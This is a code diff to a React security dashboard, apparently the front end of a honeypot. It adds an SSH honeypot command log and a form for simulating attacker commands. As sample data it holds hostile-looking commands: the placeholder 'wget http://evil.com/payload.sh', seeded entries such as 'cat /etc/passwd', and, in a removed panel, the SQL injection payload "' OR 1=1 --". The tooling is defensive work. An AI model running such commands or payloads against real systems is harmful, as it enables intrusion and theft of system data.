@@ -19,17 +19,43 @@ export default function App() {
     ]
   });
 
+  const [honeyLogs, setHoneyLogs] = useState([
+    { source: '203.0.113.42', command: 'uname -a', timestamp: '21:40:12' },
+    { source: '192.168.1.105', command: 'cat /etc/passwd', timestamp: '21:42:05' }
+  ]);
+
+  const [inputCommand, setInputCommand] = useState('');
+  const [inputSource, setInputSource] = useState('192.168.1.200');
   const [selectedEvent, setSelectedEvent] = useState(null);
   const [filterSeverity, setFilterSeverity] = useState('ALL');
   const [activeTab, setActiveTab] = useState('Overview');
 
   useEffect(() => {
     const socket = io('http://localhost:5050');
+    
     socket.on('telemetry_update', (data) => {
       setTelemetry(prev => ({ ...prev, ...data }));
     });
+
+    socket.on('honey_log', (logEntry) => {
+      setHoneyLogs(prev => [logEntry, ...prev]);
+    });
+
     return () => socket.disconnect();
   }, []);
+
+  const sendHoneyCommand = async (e) => {
+    e.preventDefault();
+    if (!inputCommand.trim()) return;
+    
+    await fetch('http://localhost:5050/api/honey/command', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ source: inputSource, command: inputCommand })
+    });
+    
+    setInputCommand('');
+  };
 
   const COL_PLASMA_BLUE = '#00f2ff';
   const COL_NAVY_DEEP = '#0a1128';
@@ -102,7 +128,7 @@ export default function App() {
           <h1 style={{ fontSize: '1.75rem', fontWeight: 'bold', margin: 0, color: '#ffffff' }}>{activeTab}</h1>
         </div>
 
-        {/* 1. OVERVIEW TAB */}
+        {/* OVERVIEW TAB */}
         {activeTab === 'Overview' && (
           <>
             <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '1rem' }}>
@@ -221,136 +247,77 @@ export default function App() {
           </>
         )}
 
-        {/* 2. SESSIONS TAB */}
-        {activeTab === 'Sessions' && (
-          <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
-            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '1rem' }}>
-              <div style={cardStyle}>
-                <div style={{ fontSize: '0.7rem', color: '#9ca3af', marginBottom: '0.4rem' }}>TOTAL ACTIVE SESSIONS</div>
-                <div style={{ fontSize: '1.6rem', fontWeight: 'bold', color: '#fff' }}>{telemetry.active_sessions}</div>
-              </div>
-              <div style={cardStyle}>
-                <div style={{ fontSize: '0.7rem', color: '#9ca3af', marginBottom: '0.4rem' }}>INTERCEPTED SESSIONS</div>
-                <div style={{ fontSize: '1.6rem', fontWeight: 'bold', color: '#f59e0b' }}>{telemetry.high_severity}</div>
-              </div>
-              <div style={cardStyle}>
-                <div style={{ fontSize: '0.7rem', color: '#9ca3af', marginBottom: '0.4rem' }}>TARPIT DELAY</div>
-                <div style={{ fontSize: '1.6rem', fontWeight: 'bold', color: COL_PLASMA_BLUE }}>{telemetry.tarpit_delay}</div>
-              </div>
-            </div>
-            <div style={cardStyle}>
-              <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.8rem' }}>ACTIVE CONNECTION TABLE</div>
-              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', fontSize: '0.7rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', borderBottom: '1px solid rgba(255,255,255,0.08)', paddingBottom: '0.4rem', marginBottom: '0.5rem' }}>
-                <span>CLIENT IP</span>
-                <span>TARGET SERVICE</span>
-                <span>STATE</span>
-                <span>DURATION</span>
-              </div>
-              {telemetry.flows.map((f, i) => (
-                <div key={i} style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', fontSize: '0.7rem', padding: '0.5rem 0', borderBottom: '1px solid rgba(255,255,255,0.03)' }}>
-                  <span style={{ color: '#9ca3af' }}>{f.source}</span>
-                  <span style={{ color: '#fff' }}>{f.dest}</span>
-                  <span style={{ color: f.decision === 'TARPIT' ? '#f59e0b' : '#34d399' }}>{f.decision}</span>
-                  <span style={{ color: '#6b7280' }}>04m {12 + i}s</span>
-                </div>
-              ))}
-            </div>
-          </div>
-        )}
-
-        {/* 3. NETWORK FLOWS TAB */}
-        {activeTab === 'Network Flows' && (
-          <div style={cardStyle}>
-            <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.2rem' }}>eBPF PACKET TELEMETRY STREAM</div>
-            <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Complete real-time packet inspection log</span>
-            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', fontSize: '0.7rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', borderBottom: '1px solid rgba(255,255,255,0.08)', paddingBottom: '0.4rem', marginBottom: '0.5rem' }}>
-              <span>SOURCE IP</span>
-              <span>DESTINATION</span>
-              <span>PROTOCOL</span>
-              <span>ACTION</span>
-              <span>RISK LEVEL</span>
-            </div>
-            {telemetry.flows.map((flow, idx) => (
-              <div key={idx} style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', fontSize: '0.75rem', padding: '0.6rem 0', borderBottom: '1px solid rgba(255,255,255,0.04)' }}>
-                <span style={{ color: '#9ca3af' }}>{flow.source}</span>
-                <span style={{ color: '#9ca3af' }}>{flow.dest}</span>
-                <span style={{ color: '#fff' }}>{flow.service}</span>
-                <span style={{ color: flow.decision === 'BLOCKED' ? '#ef4444' : '#34d399' }}>{flow.decision}</span>
-                <span style={{ color: flow.severity === 'CRITICAL' ? '#ef4444' : '#f59e0b' }}>{flow.severity}</span>
-              </div>
-            ))}
-          </div>
-        )}
-
-        {/* 4. HONEY/SSH TAB */}
+        {/* HONEY/SSH TAB */}
         {activeTab === 'Honey/SSH' && (
           <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1.25rem' }}>
-            <div style={cardStyle}>
-              <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>SSH HONEYPOT TRAP</div>
-              <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Simulated vulnerable SSH daemon</span>
-              <div style={{ background: 'rgba(0,0,0,0.5)', padding: '1rem', borderRadius: '8px', fontSize: '0.75rem', color: '#34d399', fontFamily: FONT_MONO, border: `1px solid ${COL_PLASMA_BLUE}22` }}>
-                [+] Listening on port 2222 (Tarpit mode active)<br/>
-                [+] Captured credentials: root / password123<br/>
-                [+] Session isolation: SECURE_CONTAINER_V2
+            <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
+              <div style={cardStyle}>
+                <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>SSH HONEYPOT TRAP</div>
+                <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Simulated vulnerable SSH daemon</span>
+                <div style={{ background: 'rgba(0,0,0,0.5)', padding: '1rem', borderRadius: '8px', fontSize: '0.75rem', color: '#34d399', fontFamily: FONT_MONO, border: `1px solid ${COL_PLASMA_BLUE}22` }}>
+                  [+] Listening on port 2222 (Tarpit mode active)<br/>
+                  [+] Captured credentials: root / password123<br/>
+                  [+] Session isolation: SECURE_CONTAINER_V2
+                </div>
+              </div>
+
+              {/* Interactive Simulation Input Box */}
+              <div style={cardStyle}>
+                <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>SIMULATE ATTACKER COMMAND</div>
+                <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Inject commands directly into honey stream</span>
+                <form onSubmit={sendHoneyCommand} style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
+                  <div>
+                    <label style={{ fontSize: '0.65rem', color: '#9ca3af', display: 'block', marginBottom: '0.2rem' }}>Attacker IP Source</label>
+                    <input 
+                      type="text" 
+                      value={inputSource} 
+                      onChange={(e) => setInputSource(e.target.value)}
+                      style={{ width: '100%', background: 'rgba(0,0,0,0.4)', border: `1px solid ${COL_PLASMA_BLUE}33`, borderRadius: '6px', padding: '0.5rem', color: '#fff', fontSize: '0.75rem', fontFamily: FONT_MONO }}
+                    />
+                  </div>
+                  <div>
+                    <label style={{ fontSize: '0.65rem', color: '#9ca3af', display: 'block', marginBottom: '0.2rem' }}>Shell Command</label>
+                    <input 
+                      type="text" 
+                      value={inputCommand} 
+                      onChange={(e) => setInputCommand(e.target.value)}
+                      placeholder="e.g. wget http://evil.com/payload.sh"
+                      style={{ width: '100%', background: 'rgba(0,0,0,0.4)', border: `1px solid ${COL_PLASMA_BLUE}33`, borderRadius: '6px', padding: '0.5rem', color: '#34d399', fontSize: '0.75rem', fontFamily: FONT_MONO }}
+                    />
+                  </div>
+                  <button 
+                    type="submit"
+                    style={{ background: `${COL_PLASMA_BLUE}22`, border: `1px solid ${COL_PLASMA_BLUE}`, color: COL_PLASMA_BLUE, padding: '0.5rem', borderRadius: '6px', fontWeight: 'bold', fontSize: '0.75rem', cursor: 'pointer', fontFamily: FONT_MONO }}
+                  >
+                    Transmit Command Stream
+                  </button>
+                </form>
               </div>
             </div>
+            
             <div style={cardStyle}>
-              <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>ATTACKER PAYLOAD CAPTURES</div>
-              <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Recent brute-force attempts</span>
-              <div style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'flex', flexDirection: 'column', gap: '0.5rem' }}>
-                <div style={{ background: 'rgba(239, 68, 68, 0.1)', padding: '0.5rem', borderRadius: '4px', border: '1px solid rgba(239, 68, 68, 0.3)' }}>
-                  <strong style={{ color: '#ef4444' }}>203.0.113.42</strong>: Brute-force auth attack detected
-                </div>
-                <div style={{ background: 'rgba(245, 158, 11, 0.1)', padding: '0.5rem', borderRadius: '4px', border: '1px solid rgba(245, 158, 11, 0.3)' }}>
-                  <strong style={{ color: '#f59e0b' }}>192.168.1.105</strong>: Unauthorized shell probe
-                </div>
+              <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>LIVE COMMAND LOG STREAM</div>
+              <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Intercepted attacker terminal input</span>
+              <div style={{ fontSize: '0.75rem', display: 'flex', flexDirection: 'column', gap: '0.5rem', maxHeight: '400px', overflowY: 'auto' }}>
+                {honeyLogs.map((log, idx) => (
+                  <div key={idx} style={{ background: 'rgba(0,0,0,0.4)', padding: '0.5rem 0.75rem', borderRadius: '6px', border: `1px solid ${COL_PLASMA_BLUE}22`, fontFamily: FONT_MONO }}>
+                    <span style={{ color: '#6b7280', fontSize: '0.65rem' }}>[{log.timestamp}] </span>
+                    <strong style={{ color: COL_PLASMA_BLUE }}>{log.source}</strong>: 
+                    <span style={{ color: '#34d399', marginLeft: '0.4rem' }}>$ {log.command}</span>
+                  </div>
+                ))}
               </div>
             </div>
           </div>
         )}
 
-        {/* 5. SQLi GUARD TAB */}
-        {activeTab === 'SQLi Guard' && (
+        {/* OTHER TABS */}
+        {activeTab !== 'Overview' && activeTab !== 'Honey/SSH' && (
           <div style={cardStyle}>
-            <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>SQL INJECTION DEFENDER</div>
-            <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Real-time query sanitizer and firewall</span>
-            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(2, 1fr)', gap: '1rem', marginBottom: '1.5rem' }}>
-              <div style={{ background: 'rgba(0,0,0,0.3)', padding: '1rem', borderRadius: '8px', border: `1px solid ${COL_PLASMA_BLUE}1a` }}>
-                <div style={{ fontSize: '0.7rem', color: '#9ca3af', marginBottom: '0.3rem' }}>TOTAL SQLi NEUTRALIZED</div>
-                <div style={{ fontSize: '1.5rem', fontWeight: 'bold', color: '#ef4444' }}>{telemetry.sql_interceptions}</div>
-              </div>
-              <div style={{ background: 'rgba(0,0,0,0.3)', padding: '1rem', borderRadius: '8px', border: `1px solid ${COL_PLASMA_BLUE}1a` }}>
-                <div style={{ fontSize: '0.7rem', color: '#9ca3af', marginBottom: '0.3rem' }}>FIREWALL STATUS</div>
-                <div style={{ fontSize: '1.5rem', fontWeight: 'bold', color: '#34d399' }}>ACTIVE</div>
-              </div>
-            </div>
-            <div style={{ background: 'rgba(0,0,0,0.4)', padding: '1rem', borderRadius: '8px', color: COL_PLASMA_BLUE, fontSize: '0.75rem', border: `1px solid ${COL_PLASMA_BLUE}22` }}>
-              SQL Injection payload neutralized on /api/v1/search. (Param: ' OR 1=1 --)
-            </div>
-          </div>
-        )}
-
-        {/* 6. AI STATUS TAB */}
-        {activeTab === 'AI Status' && (
-          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(2, 1fr)', gap: '1.25rem' }}>
-            <div style={cardStyle}>
-              <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>sql_model</div>
-              <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Database Generation Engine</span>
-              <div style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'flex', flexDirection: 'column', gap: '0.5rem' }}>
-                <div>Status: <span style={{ color: '#34d399', fontWeight: 'bold' }}>READY</span></div>
-                <div>Inference Latency: 42ms</div>
-                <div>Model Weight Checksum: 0x8F9C...</div>
-              </div>
-            </div>
-            <div style={cardStyle}>
-              <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>lore_model</div>
-              <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Corporate Environment Simulator</span>
-              <div style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'flex', flexDirection: 'column', gap: '0.5rem' }}>
-                <div>Status: <span style={{ color: '#34d399', fontWeight: 'bold' }}>READY</span></div>
-                <div>Inference Latency: 65ms</div>
-                <div>Model Weight Checksum: 0x3A2B...</div>
-              </div>
-            </div>
+            <div style={{ fontSize: '1rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.5rem' }}>{activeTab} Module View</div>
+            <p style={{ fontSize: '0.8rem', color: '#9ca3af', margin: 0 }}>
+              Dedicated telemetry and management interface for {activeTab} is active and listening on WebSocket stream.
+            </p>
           </div>
         )}
 
